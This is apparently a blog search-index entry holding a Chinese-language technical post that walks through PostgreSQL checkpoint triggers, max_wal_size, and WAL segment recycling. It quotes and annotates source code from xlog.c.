<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>Postgresql max_wal_size与Xlog file</title>
      <link href="/2019/09/18/PostgreSQL/2019-09-18-Postgresql-CheckPoint/"/>
      <url>/2019/09/18/PostgreSQL/2019-09-18-Postgresql-CheckPoint/</url>
      
        <content type="html"><![CDATA[<p>​    Pg后台进程在执行用户事务时, 发生的数据更改是先写入缓冲池中, 对应PG就是shared buffers, PG缓冲池一般设置为内存的1/4左右， 缓冲池里边的这些数据修改,在事务提交时，无需同步到磁盘。 <strong>因为在事务提交时,会先写入WAL日志, 有wal日志存在,就可以在异常情况下将数据恢复, 保障数据库安全。因此数据本身是否在提交时写入磁盘将没有那么重要。</strong>Pg只是在需要时候, 例如脏页较多或者一定时间间隔后, 才将数据写回磁盘。</p><p>​    checkPoint会触发刷新xlog日志页到磁盘.</p><p>​    checkPoint称之为检查点, 一般checkpoint会将某个时间之前的脏数据全部刷新到磁盘, 以实现数据的一致性与完整性。</p><p><a href="">CheckPointer进程解析</a></p><h4 id="CheckPoint触发条件"><a href="#CheckPoint触发条件" class="headerlink" title="CheckPoint触发条件"></a>CheckPoint触发条件</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * OR-able request flag bits for checkpoints.  The "cause" bits are used only</span></span><br><span class="line"><span class="comment"> * for logging purposes.  Note: the flags must be defined so that it's</span></span><br><span class="line"><span class="comment"> * sensible to OR together request flags arising from different requestors.</span></span><br><span class="line"><span class="comment"> *   OR-able 请求检查点的标志位</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* These directly affect the behavior of CreateCheckPoint and subsidiaries */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHECKPOINT_IS_SHUTDOWN0x0001<span class="comment">/* Checkpoint is for shutdown */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHECKPOINT_END_OF_RECOVERY0x0002<span class="comment">/* Like shutdown checkpoint, but</span></span></span><br><span class="line"><span class="meta"><span class="comment"> * issued at end of WAL recovery */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHECKPOINT_IMMEDIATE0x0004<span class="comment">/* Do it without delays */</span> <span class="comment">//finish the checkpoint ASAP, ignoring checkpoint_completion_target_parameter</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHECKPOINT_FORCE0x0008<span class="comment">/* Force even if no activity */</span> <span class="comment">//force a checkpoint even if no XLOG activity has occurred  since the last one (implied by CHECKPOINT_IS_SHUTDOWN or CHECKPOINT_END_OF_RECOVERY)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHECKPOINT_FLUSH_ALL0x0010<span class="comment">/* Flush all pages, including those</span></span></span><br><span class="line"><span class="meta"><span class="comment"> * belonging to unlogged tables */</span></span></span><br><span class="line"><span class="comment">/* These are important to RequestCheckpoint */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHECKPOINT_WAIT0x0020<span class="comment">/* Wait for completion */</span></span></span><br><span class="line"><span class="comment">/* These indicate the cause of a checkpoint request */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHECKPOINT_CAUSE_XLOG0x0040<span class="comment">/* XLOG consumption */</span> <span class="comment">// checkpoint is requested due to xlog filling. (This affects logging, and in particular enables CheckPointWarning.) </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHECKPOINT_CAUSE_TIME0x0080<span class="comment">/* Elapsed time */</span></span></span><br></pre></td></tr></table></figure><p>以上几种情况分别对应:</p><ol><li>数据库shutdown操作</li><li>数据库recovery完成</li><li>管理员强制执行 checkpoint [CHECKPINT_FORCE]</li><li>xlog日志量触发checkpoint阈值</li><li>周期进行checkpoint [ Elapsed time &gt;= CHeckPointTimeOut ]</li><li>需要刷新所有脏页 </li></ol><p>辅助性子进程checkpoint，会不断周期性检查以及xlog阈值是否达到.  而周期时间 与xlog日志量的阈值通过参数 <a href="#3">max_wal_size 与 checkpoint_completion_target</a>设置.</p><a id="more"></a>    <h4 id="CheckPoint相关参数"><a href="#CheckPoint相关参数" class="headerlink" title="CheckPoint相关参数"></a>CheckPoint相关参数</h4><ul><li><p>CheckPointSegments</p><ul><li>WAL File的数目. 由<code>checkpoint_completion_target</code> 与 <code>max_wal_size</code> 计算;</li></ul></li><li><p>checkpoint_timeout</p><ul><li>系统自动执行checkpoint之间的最大时间间隔。系统默认值是5分钟。</li></ul></li><li><p>checkpoint_completion_target</p><ul><li>该参数表示checkpoint的完成时间占两次checkpoint时间间隔的比例，系统默认值是0.5,也就是说每个checkpoint需要在checkpoints间隔时间的50%内完成。</li></ul></li><li><p>checkpoint_warning</p><ul><li>系统默认值是30秒，如果checkpoints的实际发生间隔小于该参数，将会在server log中写入写入一条相关信息。可以通过设置为0禁用。</li></ul></li></ul><h3 id="3">max_wal_size 与 wal segment file </h3><p>xlog.c 默认值. 判断wal file size; 根据以下参数计算;</p><p>max_wal_size = 1GB<br>min_wal_size = 80MB</p><ol><li><p>GUC参数最大值. 最小值设置;</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (newval-&gt;realval &lt; conf-&gt;min || newval-&gt;realval &gt; conf-&gt;max)</span><br></pre></td></tr></table></figure></li><li><p><code>checkpoint_completion_target</code> 在检查点期间用于清空脏缓冲区的时间，作为检查点间隔的一部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&#123;<span class="string">"checkpoint_completion_target"</span>, PGC_SIGHUP, WAL_CHECKPOINTS,</span><br><span class="line">gettext_noop(<span class="string">"Time spent flushing dirty buffers during checkpoint, as fraction of checkpoint interval."</span>),</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">&#125;,</span><br><span class="line">&amp;CheckPointCompletionTarget,</span><br><span class="line"><span class="number">0.5</span>, <span class="number">0.0</span>, <span class="number">1.0</span>,</span><br><span class="line"><span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p><code>checkpoint_completion_target</code> 默认取值范围 (0, 1);</p></li><li><p>max_wal_size</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&#123;<span class="string">"max_wal_size"</span>, PGC_SIGHUP, WAL_CHECKPOINTS,</span><br><span class="line">gettext_noop(<span class="string">"Sets the WAL size that triggers a checkpoint."</span>),</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">GUC_UNIT_MB</span><br><span class="line">&#125;,</span><br><span class="line">&amp;max_wal_size_mb,</span><br><span class="line"><span class="number">64</span> * (XLOG_SEG_SIZE / (<span class="number">1024</span> * <span class="number">1024</span>)), <span class="number">2</span>, MAX_KILOBYTES,</span><br><span class="line"><span class="literal">NULL</span>, assign_max_wal_size, <span class="literal">NULL</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p><code>man_wal_size</code>:</p><p>​    boot_val: <code>64 * (XLOG_SEG_SIZE / (1024 * 1024))</code></p><p>​    最小值:  <code>2</code></p><p>​    最大值:  <code>MAX_KILOBYTES</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> SIZEOF_SIZE_T &gt; 4 &amp;&amp; SIZEOF_LONG &gt; 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_KILOBYTESINT_MAX</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_KILOBYTES(INT_MAX / 1024)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p><code>max_wal_size</code>:</p><p>assign_hook:<code>assign_max_wal_size</code></p></li><li><p>checkpoint 涉及最大段数: 计算方式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Max distance from last checkpoint, before triggering a new xlog-based</span></span><br><span class="line"><span class="comment"> * checkpoint.</span></span><br><span class="line"><span class="comment"> *    触发新的xlog检查点之前, 距离上一个检查点的最大距离; wal file size;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span>CheckPointSegments;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">assign_max_wal_size(<span class="keyword">int</span> newval, <span class="keyword">void</span> *extra)</span><br><span class="line">&#123;</span><br><span class="line">max_wal_size_mb = newval;</span><br><span class="line">CalculateCheckpointSegments();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">CalculateCheckpointSegments(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">double</span>target;</span><br><span class="line"><span class="comment">//CheckPointCompletionTarget 默认取值0.5 取值范围(0, 1);</span></span><br><span class="line">target = (<span class="keyword">double</span>) ConvertToXSegs(max_wal_size_mb) / (<span class="number">2.0</span> + CheckPointCompletionTarget);</span><br><span class="line"></span><br><span class="line">CheckPointSegments = (<span class="keyword">int</span>) target;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CheckPointSegments &lt; <span class="number">1</span>)</span><br><span class="line">CheckPointSegments = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Convert min_wal_size_mb and max wal_size_mb to equivalent segment count */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ConvertToXSegs(x)\</span></span><br><span class="line">(x / (XLOG_SEG_SIZE / (<span class="number">1024</span> * <span class="number">1024</span>)))</span><br></pre></td></tr></table></figure><p>计算得知 <code>CheckPointSegments</code> 取值范围 (1, max_wal_size_mb * (1/3 - 1/2));</p></li><li><p>关于 wal file size 以及 段文件替换</p><p><code>XLogFileInit</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">max_segno = logsegno + CheckPointSegments;</span><br><span class="line"><span class="keyword">if</span> (!InstallXLogFileSegment(&amp;installed_segno, tmppath,</span><br><span class="line">*use_existent, max_segno,</span><br><span class="line">use_lock))</span><br></pre></td></tr></table></figure><p><code>InstallXLogFileSegment</code> </p><p><em>Install a new XLOG segment file as a current or future log segment.</em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Find a free slot to put it in */</span></span><br><span class="line"><span class="keyword">while</span> (stat(path, &amp;stat_buf) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((*segno) &gt;= max_segno)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* Failed to find a free slot within specified range */</span></span><br><span class="line"><span class="keyword">if</span> (use_lock)</span><br><span class="line">LWLockRelease(ControlFileLock);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">(*segno)++;</span><br><span class="line">XLogFilePath(path, ThisTimeLineID, *segno);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="移除XLOG"><a href="#移除XLOG" class="headerlink" title="移除XLOG"></a>移除XLOG</h4><p>经常在做恢复的时候发现有的xlog file无法找到. 被覆盖使用. 那么</p><p>xlog文件什么时候删除?</p><p>删除多少，保留多少xlog文件?</p><p>都有哪些xlog文件需要保留?</p><ol><li><p>需要首先估算两次checkpoint之间的xlog量。 计算最大的日志文件号 从而回收不需要的文件，并且进行重命名，提供即将使用的;</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Update the estimate of distance between checkpoints.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The estimate is used to calculate the number of WAL segments to keep</span></span><br><span class="line"><span class="comment"> * preallocated, see XLOGFileSlop().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">UpdateCheckPointDistanceEstimate(uint64 nbytes)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * To estimate the number of segments consumed between checkpoints, keep a</span></span><br><span class="line"><span class="comment"> * moving average of the amount of WAL generated in previous checkpoint</span></span><br><span class="line"><span class="comment"> * cycles. However, if the load is bursty, with quiet periods and busy</span></span><br><span class="line"><span class="comment"> * periods, we want to cater for the peak load. So instead of a plain</span></span><br><span class="line"><span class="comment"> * moving average, let the average decline slowly if the previous cycle</span></span><br><span class="line"><span class="comment"> * used less WAL than estimated, but bump it up immediately if it used</span></span><br><span class="line"><span class="comment"> * more.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * When checkpoints are triggered by max_wal_size, this should converge to</span></span><br><span class="line"><span class="comment"> * CheckpointSegments * XLOG_SEG_SIZE,</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note: This doesn't pay any attention to what caused the checkpoint.</span></span><br><span class="line"><span class="comment"> * Checkpoints triggered manually with CHECKPOINT command, or by e.g.</span></span><br><span class="line"><span class="comment"> * starting a base backup, are counted the same as those created</span></span><br><span class="line"><span class="comment"> * automatically. The slow-decline will largely mask them out, if they are</span></span><br><span class="line"><span class="comment"> * not frequent. If they are frequent, it seems reasonable to count them</span></span><br><span class="line"><span class="comment"> * in as any others; if you issue a manual checkpoint every 5 minutes and</span></span><br><span class="line"><span class="comment"> * never let a timed checkpoint happen, it makes sense to base the</span></span><br><span class="line"><span class="comment"> * preallocation on that 5 minute interval rather than whatever</span></span><br><span class="line"><span class="comment"> * checkpoint_timeout is set to.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PrevCheckPointDistance = nbytes;</span><br><span class="line"><span class="keyword">if</span> (CheckPointDistanceEstimate &lt; nbytes) <span class="comment">//更新估算量;</span></span><br><span class="line">CheckPointDistanceEstimate = nbytes;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">CheckPointDistanceEstimate =</span><br><span class="line">(<span class="number">0.90</span> * CheckPointDistanceEstimate + <span class="number">0.10</span> * (<span class="keyword">double</span>) nbytes); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>计算上一次checkpoint时所在的文件段号:   根据KeepLogSeg 确定保留的logSegNo</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Compute a segment number from an XLogRecPtr.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * For XLByteToSeg, do the computation at face value.  For XLByteToPrevSeg,</span></span><br><span class="line"><span class="comment"> * a boundary byte is taken to be in the previous segment.  This is suitable</span></span><br><span class="line"><span class="comment"> * for deciding which segment to write given a pointer to a record end,</span></span><br><span class="line"><span class="comment"> * for example.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XLByteToSeg(xlrp, logSegNo) \</span></span><br><span class="line">logSegNo = (xlrp) / XLogSegSize</span><br><span class="line"></span><br><span class="line">#define XLByteToPrevSeg(xlrp, logSegNo) \</span><br><span class="line">logSegNo = ((xlrp) - <span class="number">1</span>) / XLogSegSize</span><br></pre></td></tr></table></figure><p><code>KeepLogSeg</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Retreat *logSegNo to the last segment that we need to retain because of</span></span><br><span class="line"><span class="comment"> * either wal_keep_segments or replication slots.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This is calculated by subtracting wal_keep_segments from the given xlog</span></span><br><span class="line"><span class="comment"> * location, recptr and by making sure that that result is below the</span></span><br><span class="line"><span class="comment"> * requirement of replication slots.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">KeepLogSeg(XLogRecPtr recptr, XLogSegNo *logSegNo)</span><br><span class="line">&#123;</span><br><span class="line">XLogSegNosegno;</span><br><span class="line">XLogRecPtrkeep;</span><br><span class="line"></span><br><span class="line">XLByteToSeg(recptr, segno);</span><br><span class="line">keep = XLogGetReplicationSlotMinimumLSN();  <span class="comment">//获取备机请求的lSN; 防止备机某些请求, 但删除了LOGSEG;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* compute limit for wal_keep_segments first */</span></span><br><span class="line"><span class="keyword">if</span> (wal_keep_segments &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* avoid underflow, don't go below 1 */</span></span><br><span class="line"><span class="keyword">if</span> (segno &lt;= wal_keep_segments)</span><br><span class="line">segno = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">segno = segno - wal_keep_segments;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* then check whether slots limit removal further */</span></span><br><span class="line"><span class="keyword">if</span> (max_replication_slots &gt; <span class="number">0</span> &amp;&amp; keep != InvalidXLogRecPtr)</span><br><span class="line">&#123;</span><br><span class="line">XLogSegNoslotSegNo;</span><br><span class="line"></span><br><span class="line">XLByteToSeg(keep, slotSegNo); <span class="comment">//获取备机请求的LSN所在LogSegNo;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (slotSegNo &lt;= <span class="number">0</span>)</span><br><span class="line">segno = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (slotSegNo &lt; segno)</span><br><span class="line">segno = slotSegNo;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* don't delete WAL segments newer than the calculated segment */</span></span><br><span class="line"><span class="keyword">if</span> (segno &lt; *logSegNo)</span><br><span class="line">*logSegNo = segno;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="2019-09-20-Postgresql-Wal file - wal size.assets/1568796985953.png" alt="1568796985953"></p></li></ol><ol><li><p><code>RemoveXlogFile</code> 利用得到的logsegno, 回收之前的wal file; </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">XLogSegNoendlogSegNo;</span><br><span class="line">XLogSegNorecycleSegNo;</span><br><span class="line">   </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Initialize info about where to try to recycle to.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">XLByteToSeg(endptr, endlogSegNo);  <span class="comment">//获取保留的文件段号;</span></span><br><span class="line"><span class="keyword">if</span> (PriorRedoPtr == InvalidXLogRecPtr)</span><br><span class="line">recycleSegNo = endlogSegNo + <span class="number">10</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">recycleSegNo = XLOGfileslop(PriorRedoPtr);</span><br><span class="line">   </span><br><span class="line"><span class="built_in">snprintf</span>(path, MAXPGPATH, XLOGDIR <span class="string">"/%s"</span>, segname);</span><br><span class="line">   </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Before deleting the file, see if it can be recycled as a future log</span></span><br><span class="line"><span class="comment"> * segment. Only recycle normal files, pg_standby for example can create</span></span><br><span class="line"><span class="comment"> * symbolic links pointing to a separate archive directory.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (endlogSegNo &lt;= recycleSegNo &amp;&amp;</span><br><span class="line">lstat(path, &amp;statbuf) == <span class="number">0</span> &amp;&amp; S_ISREG(statbuf.st_mode) &amp;&amp;</span><br><span class="line">InstallXLogFileSegment(&amp;endlogSegNo, path,</span><br><span class="line">   <span class="literal">true</span>, recycleSegNo, <span class="literal">true</span>)) <span class="comment">//进行walfile的安装;</span></span><br><span class="line">&#123;</span><br><span class="line">ereport(DEBUG2,</span><br><span class="line">(errmsg(<span class="string">"recycled write-ahead log file \"%s\""</span>,</span><br><span class="line">segname)));</span><br><span class="line">CheckpointStats.ckpt_segs_recycled++;</span><br><span class="line"><span class="comment">/* Needn't recheck that slot on future iterations */</span></span><br><span class="line">endlogSegNo++;</span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">....</span><br><span class="line">       </span><br><span class="line">    XLogArchiveCleanup(segname);</span><br></pre></td></tr></table></figure><p>关于回收<code>recycleSegNo</code>值;</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * At a checkpoint, how many WAL segments to recycle as preallocated future</span></span><br><span class="line"><span class="comment"> * XLOG segments? Returns the highest segment that should be preallocated.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> XLogSegNo</span><br><span class="line">XLOGfileslop(XLogRecPtr PriorRedoPtr)</span><br><span class="line">&#123;</span><br><span class="line">XLogSegNominSegNo;</span><br><span class="line">XLogSegNomaxSegNo;</span><br><span class="line"><span class="keyword">double</span>distance;</span><br><span class="line">XLogSegNorecycleSegNo;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Calculate the segment numbers that min_wal_size_mb and max_wal_size_mb</span></span><br><span class="line"><span class="comment"> * correspond to. Always recycle enough segments to meet the minimum, and</span></span><br><span class="line"><span class="comment"> * remove enough segments to stay below the maximum.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">minSegNo = PriorRedoPtr / XLOG_SEG_SIZE + ConvertToXSegs(min_wal_size_mb) - <span class="number">1</span>;</span><br><span class="line">maxSegNo = PriorRedoPtr / XLOG_SEG_SIZE + ConvertToXSegs(max_wal_size_mb) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Between those limits, recycle enough segments to get us through to the</span></span><br><span class="line"><span class="comment"> * estimated end of next checkpoint.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * To estimate where the next checkpoint will finish, assume that the</span></span><br><span class="line"><span class="comment"> * system runs steadily consuming CheckPointDistanceEstimate bytes between</span></span><br><span class="line"><span class="comment"> * every checkpoint.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The reason this calculation is done from the prior checkpoint, not the</span></span><br><span class="line"><span class="comment"> * one that just finished, is that this behaves better if some checkpoint</span></span><br><span class="line"><span class="comment"> * cycles are abnormally short, like if you perform a manual checkpoint</span></span><br><span class="line"><span class="comment"> * right after a timed one. The manual checkpoint will make almost a full</span></span><br><span class="line"><span class="comment"> * cycle's worth of WAL segments available for recycling, because the</span></span><br><span class="line"><span class="comment"> * segments from the prior's prior, fully-sized checkpoint cycle are no</span></span><br><span class="line"><span class="comment"> * longer needed. However, the next checkpoint will make only few segments</span></span><br><span class="line"><span class="comment"> * available for recycling, the ones generated between the timed</span></span><br><span class="line"><span class="comment"> * checkpoint and the manual one right after that. If at the manual</span></span><br><span class="line"><span class="comment"> * checkpoint we only retained enough segments to get us to the next timed</span></span><br><span class="line"><span class="comment"> * one, and removed the rest, then at the next checkpoint we would not</span></span><br><span class="line"><span class="comment"> * have enough segments around for 